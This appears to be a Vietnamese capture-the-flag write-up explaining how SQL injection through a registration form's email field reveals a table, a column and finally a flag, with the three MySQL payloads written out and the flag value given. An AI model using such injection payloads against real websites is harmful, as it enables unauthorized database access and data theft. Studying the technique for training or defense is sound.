Tìm cách inject được SQL: đương nhiên không phải ở trang `login`, nên thử ở trang `register` . Khi đăng kí thành công, quay lại trang login đăng nhập vào hệ thống nó sẽ hiện ra email của mình, vậy field email là nơi nên thử inject. Câu truy vấn của hệ thống sẽ có dạng

`````
Insert into ... values('username','password','email');
`````

 Vậy ta sẽ thử với payload như sau:

```mysql
d'),('u','a',(select table_name from information_schema.tables where table_schema=database() limit 1))-- -
```

lưu ý đây là payload với email, username và password phải tự bịa ra thôi.  Trang web hiện thông báo `You can logged in!`, quay ra đăng nhập sẽ được giá trị email của tài khoản là `flag`

Quá tiện rồi, cứ tưởng phải lấy tài khoản admin hay gì. Vậy tiếp tục truy xuất trong bảng flag thôi. Payload tìm tên cột:

```mysql
d'),('uu','a',(select column_name from information_schema.columns where table_name="flag" limit 1))-- -
```

ra `email` là `flag`, vậy ta cần truy vấn trong column `flag` trong table `flag`, payload cuối cùng:

```mysql
d'),('uuu','a',(select flag from flag limit 1))-- -
```

`email` là: `flag is : moaZ63rVXUhlQ8tVS7Hw`



